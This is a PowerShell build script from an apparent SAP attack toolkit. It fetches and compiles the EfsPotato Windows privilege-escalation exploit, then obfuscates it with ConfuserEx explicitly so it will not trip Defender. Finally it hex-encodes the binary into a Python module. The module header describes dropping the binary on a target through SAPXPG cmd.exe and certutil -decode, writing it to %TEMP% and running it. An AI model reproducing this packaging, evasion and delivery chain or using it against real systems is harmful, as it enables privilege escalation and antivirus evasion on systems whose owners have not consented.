<#
.SYNOPSIS
    Build the SAPMAP-vendored EfsPotato binary and inject it into
    modules/exploitation/_efspotato_blob.py.

.DESCRIPTION
    Runs on a Windows host with .NET Framework 4.7.2+ SDK + MSBuild.
    Pipeline:
      1. Clone zcgonvh/EfsPotato (single .cs file, no csproj upstream).
      2. Generate a synthetic .csproj that compiles EfsPotato.cs as
         a standalone Exe targeting net4.7.2 with AssemblyName=efs_bin.
      3. msbuild Release -> bin/Release/efs_bin.exe (~30 KB single file).
      4. ConfuserEx pass (rename + anti-debug + constants).
      5. Hex-encode -> modules/exploitation/_efspotato_blob.py.

.PARAMETER SapmapRoot
    Path to SAPMAP checkout.  Auto-detected.

.PARAMETER SkipObfuscation
    Skip ConfuserEx - dev only.

.PARAMETER UpstreamRef
    Git ref to vendor.  Default: "main".

.EXAMPLE
    PS> cd C:\src\SAPMAP\tools\efspotato
    PS> .\build.ps1
#>
[CmdletBinding()]
param(
    [string]$SapmapRoot = "",
    [switch]$SkipObfuscation = $false,
    # zcgonvh/EfsPotato's default branch is "master" (older repo
    # pattern; predates the github main-as-default switch).
    [string]$UpstreamRef = "master",
    [string]$ConfuserExUrl = "https://github.com/mkaring/ConfuserEx/releases/download/v1.6.0/ConfuserEx-CLI.zip",
    [string]$UpstreamRepoUrl = "https://github.com/zcgonvh/EfsPotato.git"
)

$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = (
        [Net.ServicePointManager]::SecurityProtocol -bor
        [Net.SecurityProtocolType]::Tls12)
} catch {
    Write-Warning "Could not enable TLS 1.2: $_"
}

if ($PSScriptRoot) {
    $Here = $PSScriptRoot
} elseif ($MyInvocation.MyCommand.Path) {
    $Here = Split-Path -Parent $MyInvocation.MyCommand.Path
} else {
    $Here = (Get-Location).Path
}
$Src       = Join-Path $Here "src"
$Upstream  = Join-Path $Src "upstream"
Write-Host "[*] Script dir   : $Here"

# ---------------------------------------------------------------------------
# Locate SAPMAP root
# ---------------------------------------------------------------------------
if (-not $SapmapRoot) {
    $candidate = $Here
    for ($i = 0; $i -lt 6; $i++) {
        $parent = Split-Path -Parent $candidate
        if (-not $parent -or $parent -eq $candidate) { break }
        $candidate = $parent
        if (Test-Path (Join-Path $candidate "modules\exploitation")) {
            $SapmapRoot = $candidate
            break
        }
    }
}
if (-not $SapmapRoot -or -not (Test-Path (Join-Path $SapmapRoot "modules\exploitation"))) {
    Write-Error @"
SAPMAP root not found.  Run from inside a SAPMAP checkout, or pass
-SapmapRoot C:\path\to\SAPMAP explicitly.
"@
    exit 1
}
$BlobPy = Join-Path $SapmapRoot "modules\exploitation\_efspotato_blob.py"
Write-Host "[*] SAPMAP root  : $SapmapRoot"
Write-Host "[*] Blob output  : $BlobPy"

# ---------------------------------------------------------------------------
# Locate msbuild
# ---------------------------------------------------------------------------
function Find-MSBuild {
    $msb = Get-Command msbuild.exe -ErrorAction SilentlyContinue
    if ($msb) { return $msb.Source }
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $path = & $vswhere -latest -prerelease -requires Microsoft.Component.MSBuild -find "MSBuild\**\Bin\MSBuild.exe" | Select-Object -First 1
        if ($path -and (Test-Path $path)) { return $path }
    }
    $bt = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
    if (Test-Path $bt) { return $bt }
    $bt2 = "${env:ProgramFiles}\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
    if (Test-Path $bt2) { return $bt2 }
    return $null
}
$MSBuild = Find-MSBuild
if (-not $MSBuild) {
    Write-Error "msbuild.exe not found.  Install Build Tools for Visual Studio 2022 (.NET desktop build tools workload)."
    exit 1
}
Write-Host "[*] msbuild      : $MSBuild"

# ---------------------------------------------------------------------------
# Clone upstream
# ---------------------------------------------------------------------------
$Git = Get-Command git.exe -ErrorAction SilentlyContinue
if (-not $Git) {
    Write-Error "git.exe not found - install Git for Windows."
    exit 1
}

if (-not (Test-Path $Upstream)) {
    Write-Host "[*] Cloning upstream from $UpstreamRepoUrl @ $UpstreamRef ..."
    & $Git.Source clone --depth 1 --branch $UpstreamRef $UpstreamRepoUrl $Upstream
    if ($LASTEXITCODE -ne 0) { throw "git clone failed" }
} else {
    Write-Host "[*] Reusing existing upstream clone at $Upstream"
    Push-Location $Upstream
    try {
        & $Git.Source fetch --depth 1 origin $UpstreamRef 2>&1 | Out-Null
        & $Git.Source checkout $UpstreamRef
    } finally { Pop-Location }
}

$UpstreamCs = Join-Path $Upstream "EfsPotato.cs"
if (-not (Test-Path $UpstreamCs)) {
    Write-Error "Expected $UpstreamCs not found - upstream layout changed?"
    exit 1
}

# ---------------------------------------------------------------------------
# Generate synthetic csproj (upstream ships .cs only)
# ---------------------------------------------------------------------------
$Csproj = Join-Path $Upstream "EfsPotato.csproj"
$csprojText = @'
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{5E8D8F11-5A6B-4F8E-A7DD-1F0B6C8E5A11}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>Zcg.Exploits.Local</RootNamespace>
    <AssemblyName>efs_bin</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <Deterministic>true</Deterministic>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>none</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <NoWarn>1691;618</NoWarn>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="EfsPotato.cs" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
</Project>
'@
[System.IO.File]::WriteAllText($Csproj, $csprojText,
    (New-Object System.Text.UTF8Encoding $false))
Write-Host "[*] Generated synthetic csproj: OutputType=Exe, TargetFramework=v4.7.2, AssemblyName=efs_bin"

# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------
Write-Host "[*] Building Release ..."
Push-Location $Upstream
try {
    & $MSBuild "EfsPotato.csproj" /t:Build /p:Configuration=Release /p:Platform=AnyCPU /v:minimal /nologo
    if ($LASTEXITCODE -ne 0) { throw "msbuild failed" }
} finally {
    Pop-Location
}

$ReleaseExe = Join-Path $Upstream "bin\Release\efs_bin.exe"
if (-not (Test-Path $ReleaseExe)) {
    Write-Error "Expected build output $ReleaseExe not found."
    exit 1
}
$buildSize = (Get-Item $ReleaseExe).Length
Write-Host ("[+] Build OK     : " + $ReleaseExe + " (" + $buildSize + " bytes)")

# ---------------------------------------------------------------------------
# ConfuserEx
# ---------------------------------------------------------------------------
$FinalExe = $ReleaseExe
if (-not $SkipObfuscation) {
    $ConfuserDir = Join-Path $Here "confuser"
    $ConfuserCli = Join-Path $ConfuserDir "Confuser.CLI.exe"
    if (-not (Test-Path $ConfuserCli)) {
        Write-Host "[*] ConfuserEx not present - downloading ..."
        $zip = Join-Path $Here "confuser.zip"
        Invoke-WebRequest -Uri $ConfuserExUrl -OutFile $zip
        if (-not (Test-Path $ConfuserDir)) {
            New-Item -ItemType Directory -Path $ConfuserDir | Out-Null
        }
        Expand-Archive -Path $zip -DestinationPath $ConfuserDir -Force
        Remove-Item $zip
    }
    Write-Host "[*] ConfuserEx   : $ConfuserCli"

    # Write the .crproj INSIDE the upstream tree so baseDir paths
    # resolve correctly (per GodPotato regression in 7e98b29).
    $Crproj = Join-Path $Upstream "ConfuserEx.crproj"
    $crBody = @'
<?xml version="1.0" encoding="utf-8"?>
<project outputDir="confused" baseDir="bin\Release" xmlns="http://confuser.codeplex.com">
  <module path="efs_bin.exe">
    <rule pattern="true" preset="none" inherit="false">
      <protection id="rename">
        <argument name="mode" value="unicode" />
        <argument name="renameArgs" value="false" />
      </protection>
      <protection id="anti debug" />
      <protection id="constants">
        <argument name="mode" value="dynamic" />
        <argument name="elements" value="SNI" />
        <argument name="cfg" value="false" />
      </protection>
    </rule>
  </module>
</project>
'@
    [System.IO.File]::WriteAllText($Crproj, $crBody,
        (New-Object System.Text.UTF8Encoding $false))

    Write-Host "[*] Running ConfuserEx pass (rename + anti-debug + constants) ..."
    Push-Location $Upstream
    try {
        & $ConfuserCli -n "ConfuserEx.crproj"
        if ($LASTEXITCODE -ne 0) { throw "ConfuserEx failed" }
    } finally {
        Pop-Location
    }
    $ConfusedExe = Join-Path $Upstream "bin\Release\confused\efs_bin.exe"
    if (-not (Test-Path $ConfusedExe)) {
        Write-Error "ConfuserEx did not produce $ConfusedExe."
        exit 1
    }
    $confSize = (Get-Item $ConfusedExe).Length
    Write-Host ("[+] Obfuscated   : " + $ConfusedExe + " (" + $confSize + " bytes)")
    $FinalExe = $ConfusedExe
} else {
    Write-Host "[!] Skipping ConfuserEx - binary will trip Defender."
}

# ---------------------------------------------------------------------------
# Hex-encode + write blob
# ---------------------------------------------------------------------------
Write-Host "[*] Hex-encoding final binary ..."
$bytes = [System.IO.File]::ReadAllBytes($FinalExe)
$size = $bytes.Length
$sha = [BitConverter]::ToString(
    [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
).Replace("-", "").ToLowerInvariant()

$sb = New-Object System.Text.StringBuilder
for ($i = 0; $i -lt $bytes.Length; $i += 40) {
    $count = [Math]::Min(40, $bytes.Length - $i)
    [void]$sb.Append('    "')
    for ($j = 0; $j -lt $count; $j++) {
        [void]$sb.Append("{0:x2}" -f $bytes[$i + $j])
    }
    [void]$sb.Append('"')
    if ($i + 40 -lt $bytes.Length) {
        [void]$sb.AppendLine()
    }
}
$body = $sb.ToString()

$nl = [Environment]::NewLine
$header  = '"""Auto-generated by tools/efspotato/build.ps1 - do not hand-edit.' + $nl
$header += $nl
$header += 'Holds the SAPMAP-vendored EfsPotato binary (.NET 4.7.2,' + $nl
$header += 'ConfuserEx-obfuscated) as a hex blob.  Delivered to the target' + $nl
$header += 'via SAPXPG cmd.exe + certutil -decode, written to' + $nl
$header += '%TEMP%/efs_bin.exe, then run as efs_bin.exe "<wrapper>" [pipe].' + $nl
$header += 'See modules/exploitation/sapmap_efspotato.py.' + $nl
$header += '"""' + $nl
$header += $nl
$header += 'EFSPOTATO_SHA256 = "' + $sha + '"' + $nl
$header += 'EFSPOTATO_SIZE   = ' + $size + $nl
$header += $nl
$header += 'EFSPOTATO_BIN_HEX = (' + $nl
$header += $body + $nl
$header += ')' + $nl

[System.IO.File]::WriteAllText($BlobPy, $header,
    (New-Object System.Text.UTF8Encoding $false))

Write-Host ("[+] Wrote " + $size + " bytes (" + ($size * 2) + " hex chars) to " + $BlobPy)
Write-Host ("[+] sha256: " + $sha)
Write-Host ""
Write-Host "[+] Done.  Commit + push the blob:"
Write-Host "      cd $SapmapRoot"
Write-Host "      git add modules/exploitation/_efspotato_blob.py"
Write-Host "      git commit -m 'Vendor EfsPotato binary blob (.NET 4.7.2, ConfuserEx)'"
Write-Host "      git push"
